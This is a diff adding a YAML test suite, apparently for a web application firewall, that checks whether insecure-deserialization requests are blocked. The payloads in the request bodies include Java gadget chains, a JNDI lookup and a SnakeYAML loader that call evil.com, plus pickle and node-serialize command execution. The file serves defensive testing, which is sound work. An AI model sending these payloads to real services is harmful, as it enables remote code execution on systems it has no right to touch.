@@ -1,0 +1,201 @@
+meta:
+  category: "Deserialization"
+  subcategory: "Insecure Deserialization"
+  owasp: "A08:2021, WSTG-INPV-04"
+  severity: "critical"
+
+tests:
+  - id: "deser-001"
+    title: "Java serialized object (magic bytes)"
+    tags: ["deserialization", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/x-java-serialized-object"
+      body: "\xac\xed\x00\x05sr\x00\x11java.util.HashMap"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-002"
+    title: "Java RMI gadget chain"
+    tags: ["deserialization", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com:1099/payload","autoCommit":true}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-003"
+    title: "PHP serialized object injection"
+    tags: ["deserialization", "php", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "data=O:8:\"stdClass\":1:{s:4:\"exec\";s:6:\"whoami\";}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-004"
+    title: "PHP phar:// deserialization"
+    tags: ["deserialization", "php", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/read"
+      query_string: "file=phar:///tmp/payload.phar"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-005"
+    title: "Python pickle injection"
+    tags: ["deserialization", "python", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/octet-stream"
+      body: "cos\nsystem\n(S'id'\ntR."
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-006"
+    title: ".NET ViewState deserialization"
+    tags: ["deserialization", "dotnet", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/form"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "__VIEWSTATE=/wEPDwUKLTEyMTY5NTczMg9kFgICAw8WAh4"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-007"
+    title: "Ruby Marshal deserialization"
+    tags: ["deserialization", "ruby", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/octet-stream"
+      body: "\x04\x08o:\x15Gem::Requirement"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-008"
+    title: "Jackson polymorphic typing"
+    tags: ["deserialization", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["AAIAZQ=="],"transletName":"a","outputProperties":{}}]'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-009"
+    title: "Fastjson autotype bypass"
+    tags: ["deserialization", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://evil.com/exploit","autoCommit":true}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-010"
+    title: "YAML deserialization (SnakeYAML)"
+    tags: ["deserialization", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/config"
+      headers:
+        Content-Type: "application/x-yaml"
+      body: "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com/\"]]]]"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-011"
+    title: "Node.js node-serialize RCE"
+    tags: ["deserialization", "nodejs", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "deser-012"
+    title: "LDAP JNDI injection"
+    tags: ["deserialization", "java", "jndi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '{"name":"${jndi:ldap://evil.com/exploit}"}'
+    expected:
+      status: 403
+      action: "block"
+
+  # --- False positives ---
+
+  - id: "deser-fp-001"
+    title: "False positive - normal JSON object"
+    tags: ["deserialization", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/data"
+      headers:
+        Content-Type: "application/json"
+      body: '{"name":"John","age":30,"active":true}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "deser-fp-002"
+    title: "False positive - YAML config"
+    tags: ["deserialization", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/config"
+      headers:
+        Content-Type: "application/x-yaml"
+      body: "server:\n  port: 8080\n  host: localhost\n"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "deser-fp-003"
+    title: "False positive - binary file upload"
+    tags: ["deserialization", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/upload"
+      headers:
+        Content-Type: "application/octet-stream"
+      body: "PNG\r\n\x1a\n"
+    expected:
+      status: 200
+      action: "allow"
